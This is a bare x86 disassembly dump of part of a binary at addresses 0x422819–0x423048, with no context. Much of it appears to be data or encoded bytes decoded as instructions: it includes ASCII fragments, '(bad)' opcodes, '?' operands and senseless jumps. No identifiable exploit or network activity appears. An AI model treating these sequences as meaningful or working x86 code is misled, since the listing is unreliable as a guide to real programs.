  422819:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  422820:	jb     0x422884
  422822:	gs je  0x4227f8
  422825:	lds    edx,FWORD PTR [eax-0x68]
  422828:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  42282c:	fs jne 0x42289e
  42282f:	push   eax
  422830:	gs fs jae 0x4228a1
  422834:	popa   
  422835:	ins    DWORD PTR es:[edi],dx
  422836:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  422849:	add    BYTE PTR [eax],al
  42284b:	add    BYTE PTR [esp+ecx*4],ch
  42284e:	push   ss
  42284f:	mov    esi,0x6f4c8773
  422854:	jb     0x4228c4
  422856:	jno    0x4228c1
  422858:	or     al,0x36
  42285a:	lods   al,BYTE PTR ds:[esi]
  42285b:	repnz push edx
  42285d:	je     0x4228ce
  42285f:	je     0x4228a5
  422861:	js     0x42281f
  422863:	cmc    
  422864:	outs   dx,DWORD PTR ds:[esi]
  422865:	ins    DWORD PTR es:[edi],dx
  422866:	popa   
  422867:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42286e:	popa   
  42286f:	jb     0x4228e6
  422871:	push   0x68736f79
  422876:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42287d:	mov    ch,0xa5
  42287f:	jns    0x4228f4
  422881:	outs   dx,DWORD PTR ds:[esi]
  422882:	addr16 popa 
  422884:	add    BYTE PTR [bp+si],bh
  422887:	sub    bh,cl
  422889:	icebp  
  42288a:	gs ins BYTE PTR es:[edi],dx
  42288c:	jae    0x4228d6
  42288e:	popa   
  42288f:	je     0x4228f9
  422891:	ins    DWORD PTR es:[edi],dx
  422892:	add    BYTE PTR gs:[bx+si],al
  422896:	in     al,dx
  422897:	mov    ecx,0x414ad1d2
  42289c:	ins    DWORD PTR es:[edi],dx
  42289d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  4228a4:	gs ins DWORD PTR es:[edi],dx
  4228a6:	add    BYTE PTR [eax],al
  4228a8:	jne    0x4228ba
  4228aa:	popa   
  4228ab:	or     BYTE PTR [esi+0x73654dbb],al
  4228b1:	popa   
  4228b2:	push   0x78000061
  4228b7:	loope  0x4228fb
  4228b9:	stos   BYTE PTR es:[edi],al
  4228ba:	je     0x42291d
  4228bc:	push   edi
  4228bd:	popa   
  4228be:	jb     0x42292b
  4228c0:	jae    0x42292d
  4228c2:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  4228c9:	loope  0x422897
  4228cb:	aad    0x6f
  4228cd:	jb     0x42293b
  4228cf:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  4228d6:	je     0x4228eb
  4228d8:	adc    al,BYTE PTR [ebp+0x77646172]
  4228de:	outs   dx,DWORD PTR ds:[esi]
  4228df:	gs ins DWORD PTR es:[edi],dx
  4228e1:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  4228e8:	outs   dx,BYTE PTR ds:[esi]
  4228e9:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  4228f0:	ja     0x422956
  4228f2:	outs   dx,DWORD PTR ds:[esi]
  4228f3:	popa   
  4228f4:	outs   dx,BYTE PTR ds:[esi]
  4228f5:	gs jae 0x42295a
  4228f8:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  4228ff:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  422907:	inc    ebx
  422908:	jb     0x4228c3
  42290a:	sbb    al,0xd9
  42290c:	jo     0x422977
  42290e:	addr16 js 0x422986
  422911:	jo     0x422988
  422913:	fs add ch,cl
  422916:	xchg   esi,eax
  422917:	in     eax,dx
  422918:	jno    0x42298b
  42291a:	iret   
  42291b:	jbe    0x422916
  42291d:	or     dh,BYTE PTR [esi-0x3]
  422920:	cwde   
  422921:	int    0xd6
  422923:	std    
  422924:	pop    ebp
  422925:	fsubr  DWORD PTR [edi]
  422927:	dec    edx
  422928:	xor    eax,0xd6cd860a
  42292d:	stc    
  42292e:	inc    ebx
  42292f:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  422935:	dec    edx
  422936:	sbb    BYTE PTR [ecx+0x52],bh
  422939:	mov    ch,al
  42293b:	jns    0x42298f
  42293d:	dec    edx
  42293e:	sbb    BYTE PTR [ecx+0x6e],bh
  422941:	xchg   edx,eax
  422942:	cmp    eax,0xcd96c5cb
  422947:	in     eax,dx
  422948:	jno    0x4229bb
  42294a:	iret   
  42294b:	jbe    0x422946
  42294d:	or     dh,BYTE PTR [esi-0x3]
  422950:	int    0x96
  422952:	std    
  422953:	pop    ebp
  422954:	jns    0x4229a1
  422956:	pop    edx
  422957:	xor    eax,0x96cd920a
  42295c:	stc    
  42295d:	inc    ebx
  42295e:	icebp  
  42295f:	(bad)  
  422960:	das    
  422961:	int    0x76
  422963:	mov    BYTE PTR [ecx+0x6e],bh
  422966:	mov    DWORD PTR [edx-0x13749387],esi
  42296c:	jns    0x4229dc
  42296e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422974:	retf   
  422975:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42297c:	jno    0x42294d
  42297e:	jbe    0x422979
  422980:	or     dh,BYTE PTR [esi-0x3]
  422983:	int    0x96
  422985:	std    
  422986:	pop    ebp
  422987:	fdiv   DWORD PTR [ebx-0x6df55465]
  42298d:	int    0x96
  42298f:	stc    
  422990:	inc    ebx
  422991:	icebp  
  422992:	(bad)  
  422993:	test   BYTE PTR [ecx+0x6e],bh
  422996:	mov    ebp,esp
  422998:	int    0x76
  42299a:	mov    BYTE PTR [ecx+0x6e],bh
  42299d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  4229a4:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  4229ab:	jno    0x42297c
  4229ad:	jbe    0x4229a8
  4229af:	or     dh,BYTE PTR [esi-0x3]
  4229b2:	cwde   
  4229b3:	int    0xd6
  4229b5:	std    
  4229b6:	pop    ebp
  4229b7:	ret    0x2be4
  4229ba:	cmp    DWORD PTR [edx],ecx
  4229bc:	xchg   ch,cl
  4229be:	(bad)  
  4229bf:	stc    
  4229c0:	inc    ebx
  4229c1:	adc    DWORD PTR [eax+0x52794ad6],ebp
  4229c7:	test   BYTE PTR [ebx-0x78913648],ch
  4229cd:	ret    0x79ab
  4229d0:	xchg   edx,eax
  4229d1:	aad    0xcb
  4229d3:	lds    edx,FWORD PTR [esi+0x7171edcd]
  4229d9:	iret   
  4229da:	jbe    0x4229d5
  4229dc:	or     dh,BYTE PTR [esi-0x3]
  4229df:	int    0x96
  4229e1:	std    
  4229e2:	pop    ebp
  4229e3:	pop    ecx
  4229e4:	ins    BYTE PTR es:[edi],dx
  4229e5:	cmp    dh,BYTE PTR ds:0x96cd920a
  4229eb:	stc    
  4229ec:	inc    ebx
  4229ed:	icebp  
  4229ee:	(bad)  
  4229ef:	push   ebx
  4229f0:	int    0x76
  4229f2:	mov    BYTE PTR [ecx+0x6e],bh
  4229f5:	mov    BYTE PTR [edi+0x47816c79],ah
  4229fb:	jns    0x422a6b
  4229fd:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  422a03:	call   0xcded:0xcd965b98
  422a0a:	jbe    0x422a40
  422a0c:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  422a13:	sbb    al,0x81
  422a15:	(bad)  
  422a16:	and    al,0x98
  422a18:	int    0xd6
  422a1a:	adc    al,0x47
  422a1c:	mov    ds:0xff8eca62,al
  422a21:	add    al,0x7d
  422a23:	add    ch,dl
  422a25:	lods   eax,DWORD PTR ds:[esi]
  422a26:	clc    
  422a27:	icebp  
  422a28:	jo     0x4229f4
  422a2a:	(bad)  
  422a2c:	jge    0x422a2e
  422a2e:	aad    0xad
  422a30:	clc    
  422a31:	icebp  
  422a32:	jo     0x4229c6
  422a34:	adc    ecx,ebp
  422a36:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  422a3d:	jo     0x422aaf
  422a3f:	jo     0x422ab1
  422a41:	jo     0x4229dd
  422a43:	xor    esi,edi
  422a45:	cwde   
  422a46:	add    al,0xc
  422a48:	add    BYTE PTR [ebp-0x80],bl
  422a4b:	xchg   DWORD PTR [eax-0x30522a80],eax
  422a51:	or     DWORD PTR [eax-0x75],ebx
  422a54:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  422a5b:	jecxz  0x422a48
  422a5d:	hlt    
  422a5e:	scas   eax,DWORD PTR es:[edi]
  422a5f:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a66:	sub    dl,0xfa
  422a69:	iret   
  422a6a:	pop    eax
  422a6b:	iret   
  422a6c:	push   0xffffffcd
  422a6e:	out    0xfd,al
  422a70:	int    0x76
  422a72:	adc    DWORD PTR [ebx],esi
  422a74:	out    0x34,al
  422a76:	sub    ecx,ecx
  422a78:	or     dh,BYTE PTR [esi-0x43]
  422a7b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a81:	sub    BYTE PTR [edi],0x6
  422a84:	sub    DWORD PTR [eax-0x72357f80],eax
  422a8a:	cmc    
  422a8b:	sub    esp,esi
  422a8d:	in     eax,dx
  422a8e:	aad    0xe9
  422a90:	add    ebx,ebp
  422a92:	mov    bh,dh
  422a94:	fcmovnbe st,st(5)
  422a96:	out    dx,eax
  422a97:	pushf  
  422a98:	xchg   edi,edi
  422a9a:	test   al,0xcf
  422a9c:	fs adc ebx,0xffffffe9
  422aa0:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422aa4:	iret   
  422aa5:	int3   
  422aa6:	call   0x80c2796f
  422aab:	jno    0x422a45
  422aad:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422ab7:	int    0xe6
  422ab9:	std    
  422aba:	xor    esp,esi
  422abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422abd:	das    
  422abe:	pop    ecx
  422abf:	push   0xffffffcd
  422ac1:	(bad)  
  422ac2:	or     eax,0xfcde9e3
  422ac7:	sub    edi,eax
  422ac9:	xchg   DWORD PTR [edi],ecx
  422acb:	iret   
  422acc:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422ad2:	add    BYTE PTR [eax-0x102c8233],0x88
  422ad9:	add    al,0xf2
  422adb:	add    DWORD PTR [ebx+0x2],0x80818069
  422ae2:	adc    dh,0x4e
  422ae5:	inc    ebx
  422ae6:	jns    0x422a6a
  422ae8:	fldlg2 
  422aea:	es int 0xc6
  422aed:	or     eax,0x809221bd
  422af2:	add    al,0x81
  422af5:	mov    al,ds:0xfb87d287
  422afa:	add    al,0xbd
  422afc:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422b03:	jns    0x422ad2
  422b05:	ins    DWORD PTR es:[edi],dx
  422b06:	and    ch,0xa0
  422b09:	push   edx
  422b0a:	add    al,0x3
  422b0c:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422b12:	push   edx
  422b13:	add    al,0x3
  422b15:	push   ebx
  422b16:	mov    al,cl
  422b18:	test   bh,bh
  422b1a:	retf   
  422b1b:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422b23:	(bad)  
  422b24:	in     al,dx
  422b25:	outs   dx,DWORD PTR ds:[esi]
  422b26:	rcl    bl,1
  422b28:	(bad)  
  422b29:	jge    0x422ae8
  422b2b:	outs   dx,DWORD PTR ds:[esi]
  422b2c:	xchg   edx,eax
  422b2d:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422b34:	sahf   
  422b35:	mov    al,ds:0x3454009e
  422b3a:	jno    0x422b9e
  422b3c:	popa   
  422b3d:	mov    ah,0x86
  422b3f:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422b46:	push   cs
  422b47:	(bad)  
  422b48:	jge    0x422b07
  422b4a:	push   eax
  422b4b:	xchg   edx,eax
  422b4c:	add    BYTE PTR [eax+0x2d048d6],0xff
  422b53:	jge    0x422b12
  422b55:	push   ss
  422b56:	xchg   edx,eax
  422b57:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422b5e:	ror    BYTE PTR [ecx+0x53d09282],1
  422b64:	jo     0x422b33
  422b66:	(bad)  
  422b67:	std    
  422b68:	xor    edx,esi
  422b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b6b:	inc    ebx
  422b6c:	(bad)  
  422b6d:	xor    al,0x2f
  422b6f:	or     esp,ebx
  422b71:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b7b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b85:	int    0xd6
  422b87:	popf   
  422b88:	aam    0x23
  422b8a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b90:	or     ch,0xd6
  422b93:	xchg   ebp,eax
  422b94:	aam    0x89
  422b96:	int    0xd6
  422b98:	icebp  
  422b99:	int    0x8d
  422b9b:	xchg   ebp,eax
  422b9c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422ba2:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422ba8:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422bae:	pushf  
  422baf:	stos   BYTE PTR es:[edi],al
  422bb0:	sahf   
  422bb1:	popa   
  422bb2:	mov    esp,0xc180804a
  422bb7:	mov    BYTE PTR [edi+0x649a62d9],al
  422bbd:	mov    ecx,edx
  422bbf:	rol    DWORD PTR [edx+0x70878492],cl
  422bc5:	int    0xc6
  422bc7:	or     eax,0x808169bd
  422bcc:	adc    dh,0x14
  422bcf:	int    0x76
  422bd1:	mov    ebp,0xd30de6cd
  422bd6:	lods   eax,DWORD PTR ds:[esi]
  422bd7:	xchg   DWORD PTR [ebx],esi
  422bd9:	retf   
  422bda:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422be1:	in     al,dx
  422be2:	push   esi
  422be3:	int    0xc6
  422be5:	or     eax,0xbd92c704
  422bea:	daa    
  422beb:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422bf5:	or     eax,0xc087add3
  422bfa:	mov    BYTE PTR [esi-0x30577740],bl
  422c00:	gs jp  0x422b87
  422c03:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422c0d:	xchg   esi,esp
  422c0f:	or     eax,0x699e30c0
  422c14:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422c1b:	xor    ebp,DWORD PTR [ebp+0x6c]
  422c1e:	int    0x10
  422c20:	mov    ebp,0x808081bc
  422c25:	int    0x7d
  422c27:	xor    ecx,DWORD PTR [edi]
  422c29:	xor    ah,0x81
  422c2c:	lea    esi,[ebp-0x7b8a19fc]
  422c32:	das    
  422c33:	add    al,0xd0
  422c35:	add    BYTE PTR [eax+0x75760480],0x8b
  422c3c:	int    0x8d
  422c3e:	mov    ch,0x4
  422c40:	cli    
  422c41:	test   BYTE PTR [edx-0x61783f79],al
  422c47:	int    0xe6
  422c49:	jge    0x422c1e
  422c4b:	xacquire xchg BYTE PTR [ebx],dh
  422c4e:	ins    DWORD PTR es:[edi],dx
  422c4f:	ins    BYTE PTR es:[edi],dx
  422c50:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422c55:	outs   dx,DWORD PTR ds:[esi]
  422c56:	lods   al,BYTE PTR ds:[esi]
  422c57:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422c5d:	inc    esp
  422c5e:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c68:	lea    edi,[ebp+0x4a58d0a]
  422c6e:	cli    
  422c6f:	test   BYTE PTR [edx+0x402cd77],al
  422c75:	mov    dh,0xa5
  422c77:	and    ebx,0xa58d04ef
  422c7d:	xchg   edx,eax
  422c7e:	mov    es,WORD PTR [edx+edi*8]
  422c81:	dec    esi
  422c82:	ja     0x422ca2
  422c84:	pop    ebp
  422c85:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c8b:	int    0xf
  422c8d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c93:	jecxz  0x422c42
  422c95:	xchg   DWORD PTR [esi+0x7d],esi
  422c98:	or     dh,BYTE PTR [esi+0xd]
  422c9b:	in     al,dx
  422c9c:	inc    esi
  422c9d:	add    al,0xef
  422c9f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422ca5:	jecxz  0x422c93
  422ca7:	jecxz  0x422c5f
  422ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422caa:	pop    esi
  422cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cac:	lods   eax,DWORD PTR ds:[esi]
  422cad:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422cb4:	lods   eax,DWORD PTR ds:[esi]
  422cb5:	mov    ss,esi
  422cb7:	mov    ebp,0x8086745d
  422cbc:	add    BYTE PTR [edi+0x760a7d76],0xd
  422cc3:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422cc9:	test   al,0x33
  422ccb:	add    BYTE PTR [edx-0x33],bh
  422cce:	leave  
  422ccf:	int    0xc6
  422cd1:	or     eax,0x808059bd
  422cd6:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422cdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cde:	jecxz  0x422cc9
  422ce0:	mov    ss,esi
  422ce2:	in     eax,dx
  422ce3:	in     al,dx
  422ce4:	add    BYTE PTR [eax],0x76
  422ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ce8:	int    0x8d
  422cea:	mov    ch,0x4
  422cec:	rcl    DWORD PTR [edx-0x32021933],cl
  422cf2:	leave  
  422cf3:	xor    esi,DWORD PTR [esi+0x34]
  422cf6:	pop    esi
  422cf7:	jbe    0x422c9e
  422cf9:	jnp    0x422c85
  422cfb:	int    0xf8
  422cfd:	xor    edx,esi
  422cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d00:	int    0x96
  422d02:	cmp    al,0x45
  422d04:	inc    ecx
  422d05:	inc    ebx
  422d06:	add    esi,DWORD PTR [edi-0x79]
  422d09:	jle    0x422ce1
  422d0b:	clc    
  422d0c:	or     ah,dh
  422d0e:	std    
  422d0f:	das    
  422d10:	pop    ecx
  422d11:	adc    DWORD PTR [ebx-0x1a],eax
  422d14:	cmp    al,0x2f
  422d16:	or     esp,DWORD PTR [edx-0x2]
  422d19:	add    BYTE PTR [eax],al
  422d1b:	mov    ebp,0x80808040
  422d20:	xor    ebp,DWORD PTR [ebp-0x31]
  422d23:	les    esi,FWORD PTR [esp+eiz*2]
  422d26:	int    0x96
  422d28:	sub    al,0xcd
  422d2a:	(bad)  
  422d2b:	stc    
  422d2c:	xor    edx,esi
  422d2e:	sbb    al,0xa
  422d30:	inc    edx
  422d31:	int    0x96
  422d33:	inc    esp
  422d34:	int    0xe6
  422d36:	std    
  422d37:	xor    esp,esi
  422d39:	xor    al,0xa
  422d3b:	pusha  
  422d3c:	retf   
  422d3d:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422d43:	test   al,0x9c
  422d45:	xor    ebp,DWORD PTR [ebp+0x6c]
  422d48:	in     al,dx
  422d49:	popf   
  422d4a:	adc    bh,ah
  422d4c:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422d53:	shl    ebp,cl
  422d55:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422d5b:	(bad)  
  422d5c:	and    al,0x77
  422d5e:	mov    ch,0xcd
  422d60:	jbe    0x422d0f
  422d62:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d68:	lods   eax,DWORD PTR ds:[esi]
  422d69:	or     dl,dh
  422d6b:	stc    
  422d6c:	test   al,0xc5
  422d6e:	int    0x8d
  422d70:	jne    0x422da1
  422d72:	pop    ecx
  422d73:	ins    DWORD PTR es:[edi],dx
  422d74:	shl    edx,cl
  422d76:	test   BYTE PTR [edi-0x2c78428a],al
  422d7c:	in     al,dx
  422d7d:	xchg   BYTE PTR [edi],ch
  422d7f:	pop    ecx
  422d80:	ins    DWORD PTR es:[edi],dx
  422d81:	xchg   DWORD PTR [esi+0x75],esi
  422d84:	int    0xc6
  422d86:	jge    0x422d57
  422d88:	les    esi,FWORD PTR [esi-0x80]
  422d8b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d8e:	les    esi,FWORD PTR [esi-0x80]
  422d91:	adc    bh,ah
  422d93:	add    BYTE PTR [eax+0x24778180],0xcd
  422d9a:	mov    WORD PTR [esp+ebx*2],?
  422d9d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422da4:	xor    al,0xa4
  422da6:	ja     0x422dcd
  422da8:	retf   0x31
  422dab:	je     0x422de1
  422dad:	pop    esp
  422dae:	shl    ebp,cl
  422db0:	mov    BYTE PTR [ecx],cl
  422db2:	xchg   esp,eax
  422db3:	xor    al,0x2c
  422db5:	int    0xc
  422db7:	das    
  422db8:	mov    ebx,0xebd38096
  422dbd:	push   ebx
  422dbe:	das    
  422dbf:	rcl    DWORD PTR [ebx],1
  422dc1:	pop    esi
  422dc2:	mov    WORD PTR [esp+ebp*1],?
  422dc5:	ja     0x422de1
  422dc7:	int    0xdb
  422dc9:	pop    edi
  422dca:	or     BYTE PTR [eax+0x13338080],0xd3
  422dd1:	jmp    0x422d58
  422dd3:	mov    eax,0x87808d81
  422dd8:	ins    DWORD PTR es:[edi],dx
  422dd9:	iret   
  422dda:	les    esi,FWORD PTR [esp+ebp*2]
  422ddd:	(bad)
  422de0:	test   DWORD PTR [esi],edi
  422de2:	mov    WORD PTR [esp+ebp*1],?
  422de5:	xor    ebx,ebx
  422de7:	mov    eax,0x8780963e
  422dec:	ins    DWORD PTR es:[edi],dx
  422ded:	add    al,0x6d
  422def:	or     edi,0xc56c34c4
  422df5:	cwde   
  422df6:	int    0xf0
  422df8:	mov    ebp,0xfcd9
  422dfd:	int    0xd9
  422dff:	int    0xf
  422e01:	jns    0x422d89
  422e03:	mov    bh,0xbd
  422e05:	sub    esp,edi
  422e07:	add    BYTE PTR [eax],al
  422e09:	cwde   
  422e0a:	int    0xf0
  422e0c:	jns    0x422e86
  422e0e:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422e14:	add    BYTE PTR [eax-0x58798787],bl
  422e1a:	mov    ebp,0xfc38
  422e1f:	jns    0x422e99
  422e21:	xchg   edx,eax
  422e22:	cmp    eax,0xeceb99cd
  422e27:	add    eax,DWORD PTR [eax]
  422e29:	add    BYTE PTR [esi-0x12ed1233],dl
  422e2f:	inc    esp
  422e30:	add    DWORD PTR [eax-0x6893680],0x35862149
  422e3a:	leave  
  422e3b:	jbe    0x422df2
  422e3d:	inc    ecx
  422e3e:	and    DWORD PTR [esi-0x778932cb],eax
  422e44:	or     dh,BYTE PTR [esi-0x78]
  422e47:	int    0x76
  422e49:	stc    
  422e4a:	int    0x96
  422e4c:	stc    
  422e4d:	pop    ebx
  422e4e:	cwde   
  422e4f:	call   0xd3e3:0x3b9effc0
  422e56:	jmp    0x3586:0x21d1bf28
  422e5d:	cmp    eax,ebp
  422e5f:	sar    DWORD PTR [ebp+0xad25392],cl
  422e65:	jbe    0x422edc
  422e67:	int    0x76
  422e69:	stc    
  422e6a:	int    0x96
  422e6c:	stc    
  422e6d:	cmp    eax,ebp
  422e6f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e75:	jmp    0xfd76:0xad25328
  422e7c:	int    0x76
  422e7e:	stc    
  422e7f:	int    0x96
  422e81:	stc    
  422e82:	cmp    eax,ebp
  422e84:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e8a:	jmp    0xd076:0xad25328
  422e91:	int    0x76
  422e93:	stc    
  422e94:	int    0x96
  422e96:	stc    
  422e97:	cmp    eax,ebp
  422e99:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e9f:	jmp    0xbd76:0xad25328
  422ea6:	leave  
  422ea7:	jbe    0x422ed6
  422ea9:	dec    ecx
  422eaa:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422eb1:	mov    al,ds:0x76c93586
  422eb6:	and    eax,0x35862169
  422ebb:	sar    BYTE PTR [esp+ebx*4],0xa
  422ebf:	jbe    0x422e91
  422ec1:	or     dh,BYTE PTR [esi-0x30]
  422ec4:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422ecc:	ror    cl,1
  422ece:	jbe    0x422ea0
  422ed0:	jo     0x422e52
  422ed2:	add    BYTE PTR [eax+0x78d076c9],0x80
  422ed9:	add    BYTE PTR [eax-0x32068933],0x96
  422ee0:	stc    
  422ee1:	cmp    eax,ebp
  422ee3:	cmp    esp,ebx
  422ee5:	sar    DWORD PTR [ebp+0x28ead392],cl
  422eeb:	push   ebx
  422eec:	ror    BYTE PTR [edx],cl
  422eee:	jbe    0x422ec0
  422ef0:	int    0x76
  422ef2:	stc    
  422ef3:	int    0x96
  422ef5:	stc    
  422ef6:	cmp    eax,ebp
  422ef8:	cmp    esp,ebx
  422efa:	sar    DWORD PTR [ebp+0x28ead392],cl
  422f00:	push   ebx
  422f01:	ror    BYTE PTR [edx],cl
  422f03:	jbe    0x422ed5
  422f05:	leave  
  422f06:	jbe    0x422e9d
  422f08:	arpl   WORD PTR [edx+0x76c98080],dx
  422f0e:	lods   eax,DWORD PTR ds:[esi]
  422f0f:	pop    esi
  422f10:	add    BYTE PTR [eax+0xd76c980],0xe6
  422f17:	add    BYTE PTR [eax-0xa983080],0xff
  422f1e:	add    BYTE PTR [eax],al
  422f20:	iret   
  422f21:	push   edi
  422f22:	xchg   ebp,eax
  422f23:	inc    DWORD PTR [eax]
  422f25:	add    BYTE PTR [ebp+0xff13],bh
  422f2b:	add    BYTE PTR [ebp+0xf3d60d],cl
  422f31:	lea    ebp,[ebp-0x72ff562a]
  422f37:	xchg   ebp,eax
  422f38:	(bad)  
  422f39:	fcmove st,st(1)
  422f3b:	jbe    0x422eea
  422f3d:	dec    esi
  422f3e:	ins    BYTE PTR es:[edi],dx
  422f3f:	add    BYTE PTR [eax-0x32068933],0x8d
  422f46:	stc    
  422f47:	cmp    eax,ebp
  422f49:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422f4f:	cmp    ecx,DWORD PTR [edi]
  422f51:	shl    edx,cl
  422f53:	sub    BYTE PTR [ebx-0x2d],dl
  422f56:	or     dh,BYTE PTR [esi+0x6d]
  422f59:	int    0x76
  422f5b:	stc    
  422f5c:	int    0x8d
  422f5e:	stc    
  422f5f:	add    al,0xb6
  422f61:	cmc    
  422f62:	cmp    BYTE PTR [ebx],0xc5
  422f65:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f6b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f6f:	or     dh,BYTE PTR [esi-0x6b]
  422f72:	mov    ah,0xb1
  422f74:	sbb    al,0x80
  422f76:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f7d:	push   eax
  422f7e:	or     dh,BYTE PTR [esi-0x13]
  422f81:	int    0x6c
  422f83:	dec    esp
  422f84:	or     dh,BYTE PTR [esi+0x11]
  422f87:	int    0x76
  422f89:	mov    bh,cl
  422f8b:	(bad)  
  422f8c:	cmc    
  422f8d:	or     cl,BYTE PTR [ecx]
  422f8f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f95:	mov    bh,cl
  422f97:	(bad)  
  422f98:	in     eax,dx
  422f99:	or     cl,BYTE PTR [ecx]
  422f9b:	push   ebp
  422f9c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422fa6:	lea    edx,[ecx]
  422fa8:	or     cl,BYTE PTR [ecx]
  422faa:	pop    ebp
  422fab:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422fb5:	stc    
  422fb6:	int    0x96
  422fb8:	stc    
  422fb9:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422fbc:	cdq    
  422fbd:	shr    ebx,cl
  422fbf:	xchg   edx,eax
  422fc0:	shr    edx,cl
  422fc2:	sub    BYTE PTR [ebx+0x13],dl
  422fc5:	inc    ebx
  422fc6:	jge    0x422ff7
  422fc8:	add    eax,0x808087ca
  422fcd:	int    0x76
  422fcf:	mov    ch,cl
  422fd1:	add    DWORD PTR ds:0xcd808081,esi
  422fd7:	mov    ch,cl
  422fd9:	jbe    0x422f63
  422fdb:	int    0x1
  422fdd:	xor    eax,0xcd808081
  422fe2:	add    BYTE PTR [edi-0x72329b92],0x88
  422fe9:	int    0xa
  422feb:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422ff1:	adc    al,0x0
  422ff3:	add    BYTE PTR [eax],al
  422ff5:	(bad)  
  422ff6:	int    0x96
  422ff8:	mov    ch,cl
  422ffa:	mov    ds:0x80808125,al
  422fff:	int    0x22
  423001:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  423007:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  42300f:	bound  eax,QWORD PTR [eax]
  423011:	jno    0x423037
  423013:	cmp    ebp,DWORD PTR [ebp-0x37]
  423016:	push   es
  423017:	push   esp
  423018:	add    BYTE PTR [eax],al
  42301a:	add    BYTE PTR [esi],cl
  42301c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42301d:	aad    0x49
  42301f:	leave  
  423020:	push   es
  423021:	pop    esp
  423022:	add    BYTE PTR [eax],al
  423024:	add    BYTE PTR [edi+0x35],dl
  423027:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  42302d:	add    BYTE PTR [eax],al
  42302f:	mov    ds:0x79d735c1,eax
  423034:	push   es
  423035:	ins    BYTE PTR es:[edi],dx
  423036:	add    BYTE PTR [eax],al
  423038:	add    BYTE PTR [eax],bl
  42303a:	iret   
  42303b:	outs   dx,BYTE PTR ds:[si]
  42303d:	add    BYTE PTR [eax],al
  42303f:	add    BYTE PTR [edi+0x3b41afb8],ch
  423045:	ins    DWORD PTR es:[edi],dx
  423046:	leave  
  423047:	push   es
  423048:	sub    al,0x0
